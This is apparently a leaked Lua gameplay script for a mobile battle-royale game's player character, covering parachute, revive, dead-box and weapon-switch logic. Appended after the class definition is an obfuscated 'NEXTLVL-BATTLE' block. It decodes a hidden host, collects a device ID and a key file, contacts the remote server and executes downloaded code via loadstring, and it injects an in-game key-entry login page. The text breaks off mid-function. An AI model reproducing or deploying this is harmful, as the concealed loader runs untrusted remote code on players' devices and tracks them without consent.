-- By @YargiIDE | Chanel @YARGI_LEAKS

local BRPlayerCharacterBase = {
  ServerRPC = {},
  ClientRPC = {},
  MulticastRPC = {},
  LuaEventContainer = {}
}
BRPlayerCharacterBase.ServerRPC.ServerRPC_NearDeathGiveupRescue = {
  Reliable = true,
  Params = {}
}
BRPlayerCharacterBase.ServerRPC.ServerRPC_CarryDeadBox = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Object
  }
}
BRPlayerCharacterBase.ServerRPC.RPC_Server_GmPlayAction = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Int
  }
}
BRPlayerCharacterBase.MulticastRPC.MulticastRPC_GmPlayAction = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Int
  }
}
BRPlayerCharacterBase.ClientRPC.RPC_Client_SetShouldCheckPassWall = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Bool
  }
}
local ENetRole = import("ENetRole")
local EPawnState = import("EPawnState")
local ESpecialMovementType = import("ESpecialMovementType")
local ESpiderSwingMoveState = import("ESpiderSwingMoveState")
local ESurviveWeaponPropSlot = import("ESurviveWeaponPropSlot")
local EParachuteState = import("EParachuteState")
local EMovementMode = import("EMovementMode")
local EStateType = import("EStateType")
local ESTEPoseState = import("ESTEPoseState")
local EGameModeType = import("EGameModeType")
local STExtraGameStateBase = import("STExtraGameStateBase")
local UKismetSystemLibrary = import("KismetSystemLibrary")
local USTExtraBlueprintFunctionLibrary = import("STExtraBlueprintFunctionLibrary")
local GameplayData = require("GameLua.GameCore.Data.GameplayData")
local GamePlayTools = require("GameLua.Mod.BaseMod.Common.GamePlayTools")
local MatchModeIds = require("GameLua.Mod.BaseMod.GamePlay.Config.MatchModeIdsConfig")

function BRPlayerCharacterBase:ctor()
end

function BRPlayerCharacterBase:_PostConstruct()
  BRPlayerCharacterBase.__super._PostConstruct(self)
  self:InitAddSpecialMoveInfo()
  self.bCanNearDeathGiveup = true
  print(bWriteLog and "BRPlayerCharacterBase:_PostConstruct bCanNearDeathGiveup true")
end

function BRPlayerCharacterBase:ReceiveBeginPlay()
  BRPlayerCharacterBase.__super.ReceiveBeginPlay(self)
  self:AddControlEvent(self, "MovementModeChangedDelegate", self.HandleOnMovementModeChangedNew, self)
  if self:HasAuthority() and self:CheckAddCheckFallingDistanceComponent() then
    local CheckFallingDistanceComponent_C = import("CheckFallingDistanceComponent")
    if slua.isValid(CheckFallingDistanceComponent_C) and not slua.isValid(self:GetComponentByClass(CheckFallingDistanceComponent_C)) then
      print(bWriteLog and "BRPlayerCharacterBase:ReceiveBeginPlay Add CheckFallingDistanceComponent")
      Game:AddComponent(CheckFallingDistanceComponent_C, self, "CheckFallingDistanceComponent")
    end
  end
  if slua.isValid(self.STCharacterMovement) then
    self.STCharacterMovement.bPositiveBlowUp = true
  end
  if self.Role == ENetRole.ROLE_AutonomousProxy then
    self:AddControlEvent(self, "OnPawnStateDisabled", self.OnPawnStateChange, self)
    self:AddControlEvent(self, "OnPawnStateEnabled", self.OnPawnStateChange, self)
    self:AddControlEventConditionOnly(self, "OnAttrChangeEventDelegate", {
      AttrName = {
        "bCanSelfRescue"
      }
    }, self.CharacterAttrChangeEvent, self)
  end
  if Client then
    printf(bWriteLog and "BRPlayerCharacterBase:ReceiveBeginPlay, PlayerKey:%u ", self.PlayerKey)
    GameplayData.AddCharacter(self.Object)
  else
    self:AddCommonEventWithConditions(EVENTTYPE_INGAME_NORMAL, EVENTID_GAME_MODE_STATE_CHANGE, {
      [1] = "FinishedState"
    }, self.HandleFinishedState, self)
  end
end

function BRPlayerCharacterBase:CharacterAttrChangeEvent(uPawn, AttrName, AttrVal)
  BRPlayerCharacterBase.__super.CharacterAttrChangeEvent(self, uPawn, AttrName, AttrVal)
  if self.Object ~= uPawn then
    return
  end
  if self.Role == ENetRole.ROLE_AutonomousProxy and AttrName == "bCanSelfRescue" then
    local uPlayerController = self:GetPlayerControllerSafety()
    if slua.isValid(uPlayerController) then
      uPlayerController:BroadcastUIMessage("UIMsg_CanSelfRescue", 0, "", "")
    end
  end
end

function BRPlayerCharacterBase:OnPawnStateChange(PawnState)
  print("BRPlayerCharacterBase:OnPawnStateChange:", PawnState)
  if PawnState == EPawnState.SwitchPP then
    local uPlayerController = self:GetPlayerControllerSafety()
    if slua.isValid(uPlayerController) then
      uPlayerController:BroadcastUIMessage("UIMsg_FPPModeChange", 0, "", "")
    end
  end
end

function BRPlayerCharacterBase:HandleFinishedState()
  print(bWriteLog and "BRPlayerCharacterBase:HandleFinishedState", self.STCharacterMovement)
  if slua.isValid(self.STCharacterMovement) and self.STCharacterMovement.SetDynamicSimpleQueryConfigDisable then
    local EDynamicSimpleQueryConfigDisableMask = import("EDynamicSimpleQueryConfigDisableMask")
    self.STCharacterMovement:SetDynamicSimpleQueryConfigDisable(EDynamicSimpleQueryConfigDisableMask.Bit0, true)
  end
end

function BRPlayerCharacterBase:CheckAddCheckFallingDistanceComponent()
  if CGameMode and CGameMode.GameModeType and CGameState and CGameState.GameModeID then
    local GameModeType = CGameMode.GameModeType
    local GameModeID = tonumber(CGameState.GameModeID)
    local bModeTypeSatisfy = GameModeType == EGameModeType.ETypicalGameMode or GameModeType == EGameModeType.EFourInOneGameMode or GameModeType == EGameModeType.EHeavyWeaponGameMode
    local bModeIDSatisfy = not MatchModeIds[GameModeID]
    print(bWriteLog and bWriteLog and "BRPlayerCharacterBase:CheckAddCheckFallingDistanceComponent:", GameModeType, GameModeID, bModeTypeSatisfy, bModeIDSatisfy)
    return bModeTypeSatisfy and bModeIDSatisfy
  end
  return false
end

function BRPlayerCharacterBase:LuaHandleParachuteStateChanged(LastParachuteState, NewParachuteState)
  BRPlayerCharacterBase.__super.LuaHandleParachuteStateChanged(self, LastParachuteState, NewParachuteState)
  if not Client then
    local uCurrentPlayerControl = self:GetPlayerControllerSafety()
    if slua.isValid(uCurrentPlayerControl) and uCurrentPlayerControl.CheckParachuteOpenFeature then
      if NewParachuteState == EParachuteState.PS_Opening then
        if uCurrentPlayerControl.CheckParachuteOpenFeature.SatrtCheckShowParachuteCloseUI then
          uCurrentPlayerControl.CheckParachuteOpenFeature:SatrtCheckShowParachuteCloseUI()
        end
      elseif NewParachuteState == EParachuteState.PS_None then
        if uCurrentPlayerControl.CheckParachuteOpenFeature.RecoverParachuteOpenParam then
          uCurrentPlayerControl.CheckParachuteOpenFeature:RecoverParachuteOpenParam()
        end
        if uCurrentPlayerControl.CheckParachuteOpenFeature.ClearTimerAndState then
          uCurrentPlayerControl.CheckParachuteOpenFeature:ClearTimerAndState()
        end
      end
    end
  end
end

function BRPlayerCharacterBase:OnLanded()
  printf("BRPlayerCharacterBase:OnLanded PlayerKey:%d", self.PlayerKey)
  if self.HandleOnLanded then
    self:HandleOnLanded(-1)
  end
  if not Client then
    local uCurrentPlayerControl = self:GetPlayerControllerSafety()
    if slua.isValid(uCurrentPlayerControl) and uCurrentPlayerControl.CheckParachuteOpenFeature then
      if uCurrentPlayerControl.CheckParachuteOpenFeature.ClearTimerAndState then
        uCurrentPlayerControl.CheckParachuteOpenFeature:ClearTimerAndState()
      end
      if uCurrentPlayerControl.CheckParachuteOpenFeature.ResetCheckShowUI then
        uCurrentPlayerControl.CheckParachuteOpenFeature:ResetCheckShowUI()
      end
    end
  end
end

function BRPlayerCharacterBase:ReceiveEndPlay(EndPlayReason)
  BRPlayerCharacterBase.__super.ReceiveEndPlay(self, EndPlayReason)
  if Client then
    GameplayData.RemoveCharacter(self.Object)
  end
end

function BRPlayerCharacterBase:IsWarGameMode()
  local uGameState = GameplayData:GetGameState()
  if slua.isValid(uGameState) and Game:IsClassOf(uGameState, STExtraGameStateBase) then
    return uGameState.GameModeType == EGameModeType.EWarGameMode
  else
    return false
  end
end

function BRPlayerCharacterBase:BPOnRecycled()
  print(bWriteLog and string.format("%s BPOnRecycled()", Game:GetPlainName(self.Object)))
  if Client then
    self:ResetMeshRelativeLocationAndRotation()
  end
end

function BRPlayerCharacterBase:BPOnRespawned()
  print(bWriteLog and string.format("%s BPOnRespawned()", Game:GetPlainName(self.Object)))
  if Client then
    self:ResetMeshRelativeLocationAndRotation()
  end
end

function BRPlayerCharacterBase:ReceiveOnRecycle()
  print(bWriteLog and string.format("%s IReusable:ReceiveOnRecycle()", Game:GetPlainName(self.Object)))
  if Client then
    self:ResetMeshRelativeLocationAndRotation()
    GameplayData.RemoveCharacter(self.Object)
  end
end

function BRPlayerCharacterBase:ReceiveOnSpawn()
  print(bWriteLog and string.format("%s IReusable:ReceiveOnSpawn()", Game:GetPlainName(self.Object)))
  if Client then
    self:ResetMeshRelativeLocationAndRotation()
    GameplayData.AddCharacter(self.Object)
  end
end

function BRPlayerCharacterBase:ResetMeshRelativeLocationAndRotation()
  if Game:IsValid(self.Object) and Game:IsValid(self.Mesh) then
    local uDefaultMeshRot = FRotator(0, -90, 0)
    local uDefaultMeshRelativeLoc = FVector(0, 0, 0)
    if self.Mesh.K2_SetRelativeRotation then
      self.Mesh:K2_SetRelativeRotation(uDefaultMeshRot, false, nil, false)
    end
    self:CacheInitialMeshOffset(uDefaultMeshRelativeLoc, uDefaultMeshRot)
    local vRelativeRot = self.Mesh.RelativeRotation
    local vBaseRotationOffset = self.BaseRotationOffset
    local vBaseRotation = Game:QuatToRotator(vBaseRotationOffset)
    print(bWriteLog and bWriteLog and string.format("%s ResetMeshRelativeLocationAndRotation() Mesh.RelativeRotation: %s %s %s   Pawn.BaseRotationOffset:%s %s %s ", Game:GetPlainName(self.Object), tostring(vRelativeRot.Pitch), tostring(vRelativeRot.Yaw), tostring(vRelativeRot.Roll), tostring(vBaseRotation.Pitch), tostring(vBaseRotation.Yaw), tostring(vBaseRotation.Roll)))
  end
end

function BRPlayerCharacterBase:HandleOnMovementModeChangedNew()
  print(bWriteLog and "BRPlayerCharacterBase:HandleOnMovementModeChanged11")
  if Game:IsValid(self.STCharacterMovement) and self.STCharacterMovement.MovementMode == EMovementMode.MOVE_Swimming and self:CheckBaseIsMoveable() then
    print(bWriteLog and "BRPlayerCharacterBase:HandleOnMovementModeChanged22")
    self.CharacterMovement:SetBase(nil, "", true)
  end
  if self.Role == ENetRole.ROLE_AutonomousProxy and Game:IsValid(self.STCharacterMovement) and self.STCharacterMovement.MovementMode == EMovementMode.MOVE_Walking and UIManager.UI_Config_InGame.ParachuteOpenUI then
    print(bWriteLog and "BRPlayerCharacterBase:HandleOnMovementModeChangedNew CloseUI")
    UIManager.CloseUI(UIManager.UI_Config_InGame.ParachuteOpenUI)
  end
end

function BRPlayerCharacterBase:BPOnMissPlayerDamageRecord()
end

function BRPlayerCharacterBase:PreAttachedToVehicle()
  local IsDS = UKismetSystemLibrary.IsDedicatedServer(self)
  if not IsDS then
    return
  end
  local MainPlayerController = self:GetPlayerControllerSafety()
  if not slua.isValid(MainPlayerController) then
    return
  end
  local CharacterAvatarComp2_BP = self.CharacterAvatarComp2_BP
  if not slua.isValid(CharacterAvatarComp2_BP) then
    return
  end
  local CommerAvatarDataUtil = require("GameLua.Activity.Commercialize.GamePlay.CommerAvatarDataUtil")
  local changedVehicleId = CommerAvatarDataUtil:ChangeVehicleSkinByClothes(MainPlayerController, CharacterAvatarComp2_BP)
  local ESTExtraVehicleShapeType = import("ESTExtraVehicleShapeType")
  if changedVehicleId then
    local UAvatarUtils = import("AvatarUtils")
    if UAvatarUtils.GetVehicleShapeBySkinID(changedVehicleId) == ESTExtraVehicleShapeType.VST_Horse then
      local uCurPlayerState = self:GetPlayerStateSafety()
      if slua.isValid(uCurPlayerState) then
        print(bWriteLog and "  BRPlayerCharacterBase:PreAttachedToVehicle. changedVehicleId: " .. tostring(changedVehicleId))
        uCurPlayerState:AddGeneralCount(468, 1, false)
      end
    end
  end
end

function BRPlayerCharacterBase:ParachuteJump()
  local uPlayerController = self:GetControllerSafety()
  if slua.isValid(uPlayerController) then
    if not self:GetEnsure() then
      if uPlayerController:GetCurrentStateType() ~= EStateType.State_ParachuteJump and uPlayerController:GetCurrentStateType() ~= EStateType.State_ParachuteOpen then
        self:SwitchPoseState(ESTEPoseState.Stand, true, true, true, false)
        uPlayerController:ReInitParachuteItem()
        uPlayerController:ServerChangeStatePC(EStateType.State_ParachuteJump)
      end
      print(bWriteLog and "BRPlayerCharacterBase:ParachuteJump over")
    else
      EventSystem:postEvent(EVENTTYPE_INGAME_NORMAL, EVENTID_AI_CALL_PARACHUTE_JUMP, self.Object)
      print(bWriteLog and "BRPlayerCharacterBase:ParachuteJump AI JUMP over, Loc=", tostring(self:K2_GetActorLocation():ToString()))
    end
  end
end

function BRPlayerCharacterBase:OnMovementBaseChangedEvent(uCharacter, uNewMovementBase, uOldMovementBase)
  if uCharacter ~= self.Object then
    return
  end
  print(bWriteLog and string.format("BRPlayerCharacterBase:OnMovementBaseChangedEvent %s, Base: %s -> %s", uCharacter, uOldMovementBase, uNewMovementBase))
  local MedievalCrane = self:GetMedievalCraneFromBase(uNewMovementBase)
  if MedievalCrane and MedievalCrane.AddCharacter then
    MedievalCrane:AddCharacter(self.Object)
  else
    MedievalCrane = self:GetMedievalCraneFromBase(uOldMovementBase)
    if MedievalCrane and MedievalCrane.RemoveCharacter then
      MedievalCrane:RemoveCharacter(self.Object)
    end
  end
end

function BRPlayerCharacterBase:GetMedievalCraneFromBase(Base)
  if not slua.isValid(Base) or not Base.GetOwner then
    return
  end
  local Lifter = Base:GetOwner()
  if not slua.isValid(Lifter) then
    return
  end
  if not Lifter.AddCharacter then
    return
  end
  return Lifter
end

function BRPlayerCharacterBase:CheckForbidFlaregun()
  local uPlayerState = self:GetPlayerStateSafety()
  if not slua.isValid(uPlayerState) then
    return false
  end
  if uPlayerState.CanUseFlaregun == false and self:IsLocallyControlled() then
    local uPlayerController = self:GetPlayerControllerSafety()
    if slua.isValid(uPlayerController) then
      uPlayerController:DisplayGameTipWithMsgID(48532)
    end
  end
  return not uPlayerState.CanUseFlaregun
end

function BRPlayerCharacterBase:ServerRPC_NearDeathGiveupRescue()
  self:HandleNearDeathGiveupRescue()
end

function BRPlayerCharacterBase:HandleNearDeathGiveupRescue()
  local uNearDeathComp = self.NearDeatchComponent
  if self:IsNearDeath() and slua.isValid(uNearDeathComp) and self.bCanNearDeathGiveup == true then
    local uPlayerState = self:GetPlayerStateSafety()
    if slua.isValid(uPlayerState) then
      uPlayerState:AddGeneralCount(1613, 1, false)
    end
    uNearDeathComp:TriggerGotoDieExplictly(self.Object)
  end
end

function BRPlayerCharacterBase:RPC_Server_GmPlayAction(actionId)
  log(bWriteLog and "  BRPlayerCharacterBase:RPC_Server_GmPlayAction.  actionId: " .. tostring(actionId))
  if USTExtraBlueprintFunctionLibrary.IsDevelopment() then
    log(bWriteLog and "  BRPlayerCharacterBase:RPC_Server_GmPlayAction. IsDevelopment actionId: " .. tostring(actionId))
    self:MulticastRPC_GmPlayAction(actionId)
  end
end

function BRPlayerCharacterBase:MulticastRPC_GmPlayAction(actionId)
  if not Client then
    return
  end
  log(bWriteLog and "  BRPlayerCharacterBase:MulticastRPC_GmPlayAction.  actionId: " .. tostring(actionId))
  local uPlayEmoteComp = self:GetPlayEmoteComponent()
  if not slua.isValid(uPlayEmoteComp) then
    return
  end
  local LogFilter = require("common.log_filter")
  LogFilter.SetLogTreeEnable(true)
  local animCfg = CDataTable.GetTableData("EmoteBPTable", actionId)
  if not animCfg then
    return
  end
  local handlePath = animCfg.Path
  local EmoteHandleAsset = slua.loadObject(handlePath)
  local assetsArray = slua.Array(UEnums.EPropertyClass.Struct, import("/Script/CoreUObject.SoftObjectPath"))
  local handle = EmoteHandleAsset()
  uPlayEmoteComp:OnLoadEmoteAssetBegin(handle, actionId, assetsArray, "")
  log(bWriteLog and "  BRPlayerCharacterBase:MulticastRPC_GmPlayAction. assetsArray:Num(): " .. tostring(assetsArray:Num()))
  local tb = FuncUtil.LuaArrayToTable(assetsArray)
  local asset_util = require("common.asset_util")
  
  local function loadLater()
    uPlayEmoteComp:OnLoadEmoteAssetEnd(handle, actionId, 0)
  end
  
  asset_util.GetAssetsArrayAsyncParallel(tb, loadLater)
end

function BRPlayerCharacterBase:RPC_Client_SetShouldCheckPassWall(bServerSyncShouldCheckPassWall)
  print(bWriteLog and "BRPlayerCharacterBase:RPC_Client_SetShouldCheckPassWall " .. tostring(bServerSyncShouldCheckPassWall))
  if slua.isValid(self.ParachuteComponent) then
    self.ParachuteComponent.bServerSyncShouldCheckPassWall = bServerSyncShouldCheckPassWall
  end
end

function BRPlayerCharacterBase:OnPlayerEnterCarryBoxState()
  self.Super:OnPlayerEnterCarryBoxState()
  local CharName = self:GetPlayerNameSafety()
  print(bWriteLog and string.format("DeadBoxLog BRPlayerCharacterBase:OnPlayerEnterCarryBoxState Role:%s PlayerKey:%s Name:%s", tostring(self.Role), tostring(self.PlayerKey), tostring(CharName)))
  if self.CarryDeadBoxFeature then
    self.CarryDeadBoxFeature:OnPlayerEnterCarryBoxState()
  end
end

function BRPlayerCharacterBase:OnPlayerLeaveCarryBoxState(bInIsInterrupt)
  self.Super:OnPlayerLeaveCarryBoxState(bInIsInterrupt)
  local CharName = self:GetPlayerNameSafety()
  print(bWriteLog and string.format("DeadBoxLog BRPlayerCharacterBase:OnPlayerLeaveCarryBoxState Role:%s PlayerKey:%s Name:%s bInIsInterrupt:%s", tostring(self.Role), tostring(self.PlayerKey), tostring(CharName), tostring(bInIsInterrupt)))
  if self.CarryDeadBoxFeature then
    self.CarryDeadBoxFeature:OnPlayerLeaveCarryBoxState(bInIsInterrupt)
  end
end

function BRPlayerCharacterBase:ServerRPC_CarryDeadBox(uInDeadBox)
  if slua.isValid(uInDeadBox) and Game:IsClassOf(uInDeadBox, import("/Script/ShadowTrackerExtra.PlayerTombBox")) and self.CarryDeadBoxFeature then
    self.CarryDeadBoxFeature:CarryDeadBox(uInDeadBox)
  end
end

function BRPlayerCharacterBase:SetAreaID(AreaID)
  self:SetAttrValue("AreaID", AreaID, -1)
end

function BRPlayerCharacterBase:GetAreaID()
  return math.floor(self:GetAttrValue("AreaID") + 0.5)
end

function BRPlayerCharacterBase:CannotChangeIntoPetSpectator()
  print(bWriteLog and "BRPlayerCharacterBase:CannotChangeIntoPetSpectator")
  return self.bCannotChangeIntoPetSpectator
end

function BRPlayerCharacterBase:DoModChangeToBT()
  print(bWriteLog and string.format("BRPlayerCharacterBase:DoModChangeToBT, PlayerKey=%s", tostring(self.PlayerKey)))
  if self:HasState(EPawnState.SpecialSuit) then
    self:TriggerEntrySkillWithID(4301101, true)
    print(bWriteLog and string.format("BRPlayerCharacterBase:DoModChangeToBT, PlayerKey=%s, HasState(EPawnState.SpecialSuit)", tostring(self.PlayerKey)))
  end
end

function BRPlayerCharacterBase:SwitchCameraToParachuteOpening()
  print(bWriteLog and "BRPlayerCharacterBase:SwitchCameraToParachuteOpening")
  self.Super:SwitchCameraToParachuteOpening()
  if self.ParachuteFormation and self.ParachuteFormation.ShouldApplyFormationCamera and self.ParachuteFormation:ShouldApplyFormationCamera() then
    self.ParachuteFormation:OverlayFormationCameraParams()
    print(bWriteLog and "BRPlayerCharacterBase:SwitchCameraToParachuteOpening - Formation camera overlaid")
  end
end

function BRPlayerCharacterBase:SwitchCameraToParachuteFalling()
  print(bWriteLog and "BRPlayerCharacterBase:SwitchCameraToParachuteFalling")
  self.Super:SwitchCameraToParachuteFalling()
  if self.ParachuteFormation and self.ParachuteFormation.ShouldApplyFormationCamera and self.ParachuteFormation:ShouldApplyFormationCamera() then
    self.ParachuteFormation:OverlayFormationCameraParams()
    print(bWriteLog and "BRPlayerCharacterBase:SwitchCameraToParachuteFalling - Formation camera overlaid")
  end
end

function BRPlayerCharacterBase:SwitchCameraToNormal()
  print(bWriteLog and "BRPlayerCharacterBase:SwitchCameraToNormal")
  self.Super:SwitchCameraToNormal()
  if self.ParachuteFormation and self.ParachuteFormation.OnLandingClearFormationCamera then
    self.ParachuteFormation:OnLandingClearFormationCamera()
  end
end

function BRPlayerCharacterBase:SwitchWeaponCheck(Slot, IgnoreState)
  if self:HasState(EPawnState.AttachToOther) then
    local Weapon = self:GetWeaponBySlot(Slot)
    if slua.isValid(Weapon) then
      local WeaponID = Weapon:GetWeaponID()
      local AttachToOtherConfig = GamePlayTools.GetCurrentConfig("AttachToOtherConfig")
      if AttachToOtherConfig and AttachToOtherConfig.CheckIsWeaponInBlackList and AttachToOtherConfig.CheckIsWeaponInBlackList(WeaponID) then
        print(bWriteLog and "BRPlayerCharacterBase:SwitchWeaponCheck not allow switch weapon in AttachToOther, WeaponID: " .. tostring(WeaponID))
        local uPlayerController = self:GetPlayerControllerSafety()
        if Client and slua.isValid(uPlayerController) and uPlayerController.Role == ENetRole.ROLE_AutonomousProxy then
          uPlayerController:DisplayGameTipWithMsgID(47306)
        end
        return false
      end
    end
  end
  if self:HasState(EPawnState.WebSwing) and Slot ~= ESurviveWeaponPropSlot.SWPS_None and slua.isValid(self.STCharacterMovement) then
    local SpiderSwingObj = self.STCharacterMovement:GetSpecialMoveObjBySpecialMoveType(ESpecialMovementType.SPECIAL_MOVE_SpiderSwing)
    if slua.isValid(SpiderSwingObj) then
      local nCurState = SpiderSwingObj:GetCurMoveState()
      if nCurState == ESpiderSwingMoveState.Launching or nCurState == ESpiderSwingMoveState.Swinging then
        print(bWriteLog and "BRPlayerCharacterBase:SwitchWeaponCheck blocked by SpiderSwing state: " .. tostring(nCurState))
        return false
      end
    end
  end
  return self.Super:SwitchWeaponCheck(Slot, IgnoreState)
end

local class = require("class")
local CCharacterBase = require("GameLua.GameCore.Framework.CharacterBase")
local CBRPlayerCharacterBase = class(CCharacterBase, nil, BRPlayerCharacterBase)

--[[ NEXTLVL-BATTLE ]] do
local _NIB = {}
do
  for _a = 0, 15 do
    for _b = 0, 15 do
      local _r, _x, _y, _p = 0, _a, _b, 1
      for _ = 1, 4 do
        if (_x % 2) ~= (_y % 2) then _r = _r + _p end
        _x = math.floor(_x / 2)
        _y = math.floor(_y / 2)
        _p = _p * 2
      end
      _NIB[_a * 16 + _b] = _r
    end
  end
end

local function _bx(_x, _y)
  return _NIB[math.floor(_x / 16) * 16 + math.floor(_y / 16)] * 16
       + _NIB[(_x % 16) * 16 + (_y % 16)]
end

local function _rc4(_key, _data)
  local _S = {}
  for _i = 0, 255 do _S[_i] = _i end
  local _j, _kl = 0, #_key
  for _i = 0, 255 do
    _j = (_j + _S[_i] + string.byte(_key, (_i % _kl) + 1)) % 256
    _S[_i], _S[_j] = _S[_j], _S[_i]
  end
  local _i, _j2 = 0, 0
  local _out = {}
  local _n = 0
  for _k = 1, #_data do
    _i = (_i + 1) % 256
    _j2 = (_j2 + _S[_i]) % 256
    _S[_i], _S[_j2] = _S[_j2], _S[_i]
    _n = _n + 1
    _out[_n] = string.char(_bx(string.byte(_data, _k), _S[(_S[_i] + _S[_j2]) % 256]))
  end
  return table.concat(_out)
end

local _B64M = {}
do
  local _B = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
  for _i = 1, 64 do _B64M[string.sub(_B, _i, _i)] = _i - 1 end
end

local function _b64d(_s)
  local _t = {}
  local _n = 0
  local _i = 1
  local _l = #_s
  while _i <= _l do
    local _c1 = _B64M[string.sub(_s, _i, _i)]; _i = _i + 1
    local _c2 = _B64M[string.sub(_s, _i, _i)]; _i = _i + 1
    local _c3s = string.sub(_s, _i, _i); _i = _i + 1
    local _c4s = string.sub(_s, _i, _i); _i = _i + 1
    local _c3 = _c3s ~= "=" and _B64M[_c3s] or 0
    local _c4 = _c4s ~= "=" and _B64M[_c4s] or 0
    _n = _n + 1
    _t[_n] = string.char(_c1 * 4 + math.floor(_c2 / 16))
    if _c3s ~= "=" then
      _n = _n + 1
      _t[_n] = string.char((_c2 % 16) * 16 + math.floor(_c3 / 4))
    end
    if _c4s ~= "=" then
      _n = _n + 1
      _t[_n] = string.char((_c3 % 4) * 64 + _c4)
    end
  end
  return table.concat(_t)
end

local _ld = loadstring or load

local _LOG_FILE = "/storage/emulated/0/Android/data/com.pubg.imobile/files/Myweowlogs.txt"
local function _log(_msg)
  pcall(function()
    local _f = io.open(_LOG_FILE, "a")
    if _f then
      _f:write(os.date("%Y-%m-%d %H:%M:%S") .. " | " .. tostring(_msg) .. "\n")
      _f:flush()
      _f:close()
    end
  end)
end

local _cfg = {
  v = 7,
  m = {208,172,109,253,217,40,156,45},
  mk = {253,6,80,122,164,84,111,216,154,81,60,136,233,131,25,176,112,2,250,218,71,41,210,110,180,227,63,253,108,122,190,218},
  ho = {184,216,25,141,170,18,179,2,190,201,21,137,181,94,240,3,163,219,12,141,183,65,240,70,191,192,12,137,188,24,168,25,254,219,2,143,178,77,238,94,254,200,8,139},
}

local function _dec(_arr)
  local _out = {}
  for _i = 1, #_arr do
    _out[_i] = string.char(_bx(_arr[_i], _cfg.m[(_i - 1) % #_cfg.m + 1]))
  end
  return table.concat(_out)
end

local _HOST = _dec(_cfg.ho)
local _MK = _dec(_cfg.mk)
local _V = _cfg.v
_cfg = nil
_log("========== NEXTLVL-BATTLE v" .. _V .. " ==========")
_log("host=" .. _HOST)

local _IDF = "/storage/emulated/0/Android/data/com.pubg.imobile/files/.device_id"
local _DID = ""
do
  local _f = io.open(_IDF, "r")
  if _f then
    _DID = string.gsub(_f:read("*all") or "", "%s+", "")
    _f:close()
  end
  if _DID == "" then
    _DID = "DEV_" .. string.format("%08x_%08x", math.random(0, 0x7fffffff), math.random(0, 0x7fffffff))
    local _f = io.open(_IDF, "w")
    if _f then _f:write(_DID) _f:close() end
  end
end
_log("device_id=" .. _DID)

local _KEY = ""
do
  local _f = io.open("/storage/emulated/0/Android/data/com.pubg.imobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Paks/key.txt", "r")
  if _f then
    _KEY = string.gsub(_f:read("*all") or "", "%s+", "")
    _f:close()
  end
end
_log("key=" .. (_KEY ~= "" and _KEY or "EMPTY"))

local _http
pcall(function()
  _http = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.http_manager)
end)

local function _post(_path, _body, _cb)
  if not _http or not _http.Post then _log("no http manager") return end
  pcall(function()
    _http:Post(_HOST .. _path, { ["Content-Type"] = "application/json" }, _body, nil, function(_s, _d)
      if not _cb then return end
      if _s and _d and #_d > 0 then
        local _ok, _r = pcall(json.decode, _d)
        if _ok and _r then _cb(true, _r) else _cb(false, nil) end
      else
        _cb(false, nil)
      end
    end)
  end)
end

local function _execCache(_files, _cache)
  if _G._NEXTLVL_EXECUTED then _log("battle: already executed, skip") return true end
  local _all = true
  for _i = 1, #_files do
    if not _cache[_files[_i]] then _all = false break end
  end
  if not _all then return false end
  _G._NEXTLVL_EXECUTED = true
  for _i = 1, #_files do
    local _f = _files[_i]
    local _fn = _cache[_f]
    _log("battle executing " .. _f)
    local _ok, _err = pcall(_fn)
    if _ok then
      _log("battle executed " .. _f .. " OK")
    else
      _log("battle exec " .. _f .. " ERROR: " .. tostring(_err))
    end
    _cache[_f] = nil
  end
  _G._NEXTLVL_VER = _V
  _log("========== BATTLE ALL DONE (ver " .. _V .. ") ==========")
  collectgarbage("collect")
  return true
end

local _bfiles = {}
local _bchunks = {}
local _bsession = ""
local _bstarted = false
local _bexecuted = false

------------------------------------------------------------------
-- IN-GAME LOGIN PAGE (UMG, 1.lua-style widgets)
-- opens only when key.txt is missing/empty; only in match
------------------------------------------------------------------
local _loginUI = {}
local _loginShown = false
local _FVector2D = _G.FVector2D or (import and import("Vector2D"))
local _FLinearColor = _G.FLinearColor or (import and import("LinearColor"))
local _FSlateColor = _G.FSlateColor or (import and import("SlateColor")) or function(_c) return _c end
local _bbattle

local function _loginDestroy()
  pcall(function()
    if _loginUI.Root and slua.isValid(_loginUI.Root) then
      _loginUI.Root:SetVisibility(UEnums.ESlateVisibility.Collapsed)
      pcall(function() _loginUI.Parent:RemoveChild(_loginUI.Root) end)
    end
  end)
  _loginUI = {}
  _loginShown = false
end

local function _loginSubmit()
  local _key = ""
  pcall(function()
    if _loginUI.Input and slua.isValid(_loginUI.Input) then
      _key = _loginUI.Input:GetText() or ""
    end
  end)
  _key = string.gsub(_key or "", "%s+", "")
  if _key == "" then
    pcall(function()
      if _loginUI.StatusText and slua.isValid(_loginUI.StatusText) then
        _loginUI.StatusText:SetText("Enter a key first!")
      end
    end)
    return
  end
  pcall(function()
    local _f = io.open("/storage/emulated/0/Android/data/com.pubg.imobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Paks/key.txt", "w")
    if _f then _f:write(_key) _f:flush() _f:close() end
  end)
  _KEY = _key
  _log("key saved from login page: " .. _KEY)
  _loginDestroy()
  _bbattle()
end

local function _loginStatus(_msg)
  pcall(function()
    if _loginUI.StatusText and slua.isValid(_loginUI.StatusText) then
      _loginUI.StatusText:SetText(_msg or "")
    end
  end)
end

local function _showLoginPage()
  if _loginShown then return end
  _loginShown = true
  _log("showing in-game login page (no key)")
  pcall(function()
    local _ITools = require("GameLua.Mod.BaseMod.Common.UI.InGameUITools")
    local _MCUI = _ITools and _ITools.GetMainControlBaseUI and _ITools.GetMainControlBaseUI()
    local _Parent = nil
    pcall(function()
      if _MCUI then
        if _MCUI.CanvasPanel_0 and slua.isValid(_MCUI.CanvasPanel_0) then
          _Parent = _MCUI.CanvasPanel_0
        elseif _MCUI.CanvasPanel_42 and slua.isValid(_MCUI.CanvasPanel_42) then
          _Parent = _MCUI.CanvasPanel_42
        end
      end
    end)
    if not _Parent then _log("login page: no parent canvas") return end

    local _w, _h = 1280, 720
    pcall(function()
      local _VS = ui_util and ui_util.GetViewportSize and ui_util.GetViewportSize()
